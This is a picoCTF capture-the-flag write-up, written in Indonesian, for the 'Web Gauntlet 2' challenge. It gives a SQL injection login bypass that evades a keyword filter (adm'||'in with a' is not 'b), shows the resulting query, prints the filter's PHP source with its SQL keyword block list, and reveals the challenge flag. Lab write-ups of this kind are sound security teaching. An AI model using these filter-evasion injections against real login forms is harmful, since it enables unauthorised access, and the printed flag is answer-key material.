# Web Gauntlet 2
- Link: https://play.picoctf.org/practice/challenge/174?category=1&page=3

## Tantangan
This website looks familiar... Log in as admin Site: http://mercury.picoctf.net:35178/ Filter: http://mercury.picoctf.net:35178/filter.php

## Penyelesaian
- Buka URL http://mercury.picoctf.net:35178/ di browser. Disini terlihat bahwa kita harus login menggunakan SQL Injection

![alt text](https://github.com/rahardian-dwi-saputra/picoCTF-writeup/blob/main/Web%20Exploitations/Web%20Gauntlet%202/assets/web%20gauntlet%201.JPG)

- Buka URL http://mercury.picoctf.net:35178/filter.php di browser untuk melihat input yang tidak diperbolehkan 

![alt text](https://github.com/rahardian-dwi-saputra/picoCTF-writeup/blob/main/Web%20Exploitations/Web%20Gauntlet%202/assets/web%20gauntlet%202.JPG)

- Dari sekian banyak input username dan password, kita bisa memasukkan input berikut untuk membypass login
```sh
username: adm'||'in
password: a' is not 'b
```

![alt text](https://github.com/rahardian-dwi-saputra/picoCTF-writeup/blob/main/Web%20Exploitations/Web%20Gauntlet%202/assets/web%20gauntlet%203.JPG)

- Dari inputan diatas akan terbentuk query sebagai berikut
```sh
SELECT username, password FROM users WHERE username='adm'||'in' AND password='a' is not 'b'
```

![alt text](https://github.com/rahardian-dwi-saputra/picoCTF-writeup/blob/main/Web%20Exploitations/Web%20Gauntlet%202/assets/web%20gauntlet%204.JPG)

- Sekarang kita buka URL http://mercury.picoctf.net:35178/filter.php untuk mendapatkan flag. Berikut adalah isi halaman setelah kita berhasil membypass login
```sh
<?php
session_start();

if (!isset($_SESSION["winner2"])) {
    $_SESSION["winner2"] = 0;
}
$win = $_SESSION["winner2"];
$view = ($_SERVER["PHP_SELF"] == "/filter.php");

if ($win === 0) {
    $filter = array("or", "and", "true", "false", "union", "like", "=", ">", "<", ";", "--", "/*", "*/", "admin");
    if ($view) {
        echo "Filters: ".implode(" ", $filter)."<br/>";
    }
} else if ($win === 1) {
    if ($view) {
        highlight_file("filter.php");
    }
    $_SESSION["winner2"] = 0;        // <- Don't refresh!
} else {
    $_SESSION["winner2"] = 0;
}

// picoCTF{0n3_m0r3_t1m3_86f3e77f3c5a076866a0fdb3b29c52fd}
?>
```
- Flag
```sh
picoCTF{0n3_m0r3_t1m3_86f3e77f3c5a076866a0fdb3b29c52fd}
```